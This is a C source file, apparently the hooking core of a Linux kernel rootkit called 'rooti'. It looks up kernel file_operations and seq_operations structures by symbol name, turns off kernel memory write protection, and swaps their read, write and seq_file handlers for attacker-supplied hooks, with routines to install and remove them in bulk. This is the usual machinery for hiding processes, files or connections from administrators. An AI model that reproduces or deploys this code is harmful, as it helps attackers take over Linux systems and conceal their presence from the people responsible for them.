#include <linux/kernel.h>
#include <linux/seq_file.h>
#include "utils.h"
#include "ops.h"

/*
    Overrides the desired operation handler in the file_operatios struct with hook->func and saves a
    reference to the original function in hook->orig.
*/
static int rooti_override_file_ops(struct file_operations *file_ops, struct rooti_file_ops_hook *hook)
{
    switch (hook->ops) {
        case ROOTI_FILE_READ_ITER:
            *((unsigned long *)hook->orig) = (unsigned long)file_ops->read_iter;
            file_ops->read_iter = hook->func;
            break;
        case ROOTI_FILE_WRITE_ITER:
            *((unsigned long *)hook->orig) = (unsigned long)file_ops->write_iter;
            file_ops->write_iter = hook->func;
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

/*
    Restore the desired operation handler in the file_operatios struct to the original kernel function,
    previously stored in hook->orig.
*/
static int rooti_restore_file_ops(struct file_operations *file_ops, struct rooti_file_ops_hook *hook)
{
    switch (hook->ops) {
        case ROOTI_FILE_READ_ITER:
            *((unsigned long *)&file_ops->read_iter) = *((unsigned long *)hook->orig);
            break;
        case ROOTI_FILE_WRITE_ITER:
            *((unsigned long *)&file_ops->write_iter) = *((unsigned long *)hook->orig);
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

/*
    Overrides the desired operation handler in the seq_operatios struct with hook->func and saves a
    reference to the original function in hook->orig.
*/
static int rooti_override_seq_ops(struct seq_operations *seq_ops, struct rooti_seq_ops_hook *hook)
{
    switch (hook->ops) {
        case ROOTI_SEQ_START:
            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->start;
            seq_ops->start = hook->func;
            break;
        case ROOTI_SEQ_STOP:
            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->stop;
            seq_ops->stop = hook->func;
            break;
        case ROOTI_SEQ_NEXT:
            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->next;
            seq_ops->next = hook->func;
            break;
        case ROOTI_SEQ_SHOW:
            *((unsigned long *)hook->orig) = (unsigned long)seq_ops->show;
            seq_ops->show = hook->func;
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

/*
    Restore the desired operation handler in the seq_operatios struct to the original kernel function,
    previously stored in hook->orig.
*/
static int rooti_restore_seq_ops(struct seq_operations *seq_ops, struct rooti_seq_ops_hook *hook)
{
    switch (hook->ops) {
        case ROOTI_SEQ_START:
            *((unsigned long *)&seq_ops->start) = *((unsigned long *)hook->orig);
            break;
        case ROOTI_SEQ_STOP:
            *((unsigned long *)&seq_ops->stop) = *((unsigned long *)hook->orig);
            break;
        case ROOTI_SEQ_NEXT:
            *((unsigned long *)&seq_ops->next) = *((unsigned long *)hook->orig);
            break;
        case ROOTI_SEQ_SHOW:
            *((unsigned long *)&seq_ops->show) = *((unsigned long *)hook->orig);
            break;
        default:
            return -EINVAL;
    }
    return 0;
}

/*
    Installs a hook on a filefile operation by resolving the address of the file_operations struct
    by the symbol name and overriding the pointer to handler of the desired operation. 
*/
int rooti_install_file_ops_hook(struct rooti_file_ops_hook *hook)
{
    // Resolve the address of the file_operations struct
    struct file_operations *file_ops = (struct file_operations *)__kallsyms_lookup_name(hook->symbol);

    // Disable write protection
    rooti_unprotect_memory();

    // Override the pointers in the struct
    int err = rooti_override_file_ops(file_ops, hook);
    if (err) {
        return err;
    }

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

/*
    Uninstalls the hook of the filefile operation by restoring the pointer in the file_operations struct
    to the original kernel function.
*/
int rooti_uninstall_file_ops_hook(struct rooti_file_ops_hook *hook)
{
    // Resolve the address of the file_operations struct
    struct file_operations *file_ops = (struct file_operations *)__kallsyms_lookup_name(hook->symbol);

    // Disable write protection
    rooti_unprotect_memory();

    // Restore the original pointer in the struct
    int err = rooti_restore_file_ops(file_ops, hook);
    if (err) {
        return err;
    }

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

// Installs all the file opeations hooks in the given hooks array.
int rooti_install_file_ops_hooks(struct rooti_file_ops_hook *hooks, size_t count)
{
    int ret;
    int i;
    for (i = 0; i < count; i++) {
        ret = rooti_install_file_ops_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_file_ops_hook(&hooks[--i]);
    }
    return ret;
}

// Uninstalls all registered file opeations hooks in the given hooks array.
int rooti_uninstall_file_ops_hooks(struct rooti_file_ops_hook *hooks, size_t count)
{
    int ret = 0;
    for (int i = 0; i < count; i++) {
        ret = rooti_uninstall_file_ops_hook(&hooks[i]);
    }
    return ret;
}

/*
    Installs a hook on a seqfile operation by resolving the address of the seq_operations struct
    by the symbol name and overriding the pointer to handler of the desired operation. 
*/
int rooti_install_seq_ops_hook(struct rooti_seq_ops_hook *hook)
{
    // Resolve the address of the seq_operations struct
    struct seq_operations *seq_ops = (struct seq_operations *)__kallsyms_lookup_name(hook->symbol);

    // Disable write protection
    rooti_unprotect_memory();

    // Override the pointers in the struct
    int err = rooti_override_seq_ops(seq_ops, hook);
    if (err) {
        return err;
    }

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

/*
    Uninstalls the hook of the seqfile operation by restoring the pointer in the seq_operations struct
    to the original kernel function.
*/
int rooti_uninstall_seq_ops_hook(struct rooti_seq_ops_hook *hook)
{
    // Resolve the address of the seq_operations struct
    struct seq_operations *seq_ops = (struct seq_operations *)__kallsyms_lookup_name(hook->symbol);

    // Disable write protection
    rooti_unprotect_memory();

    // Restore the original pointer in the struct
    int err = rooti_restore_seq_ops(seq_ops, hook);
    if (err) {
        return err;
    }

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

// Installs all the seq opeations hooks in the given hooks array.
int rooti_install_seq_ops_hooks(struct rooti_seq_ops_hook *hooks, size_t count)
{
    int ret;
    int i;
    for (i = 0; i < count; i++) {
        ret = rooti_install_seq_ops_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_seq_ops_hook(&hooks[--i]);
    }
    return ret;
}

// Uninstalls all registered seq opeations hooks in the given hooks array.
int rooti_uninstall_seq_ops_hooks(struct rooti_seq_ops_hook *hooks, size_t count)
{
    int ret = 0;
    for (int i = 0; i < count; i++) {
        ret = rooti_uninstall_seq_ops_hook(&hooks[i]);
    }
    return ret;
}
